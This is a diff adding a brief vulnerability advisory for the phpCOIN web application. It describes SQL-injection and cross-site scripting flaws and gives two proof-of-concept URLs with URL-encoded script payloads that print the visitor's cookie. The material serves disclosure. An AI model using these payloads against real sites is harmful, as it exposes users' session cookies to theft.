@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/12686/info
+
+Multiple remote input-validation vulnerabilities affect phpCOIN because the application fails to properly sanitize user-supplied input before using it to carry out critical functionality.
+
+An attacker may leverage these issues to manipulate and view arbitrary database contents (by exploiting various SQL-injection issues) and to run arbitrary script code in the browser of an unsuspecting user (by exploiting multiple cross-site scripting vulnerabilities). 
+
+
+http://www.example.com/phpcoin/mod.php?mod=helpdesk&mode=new
+%22%3E%3Cscript%3Edocument.write(document.cookie)%3C/script%3E
+
+http://www.example.com/phpcoin/mod.php?mod=mail&mode=reset&w=user
+%22%3E%3Cscript%3Edocument.write(document.cookie)%3C/script%3E 
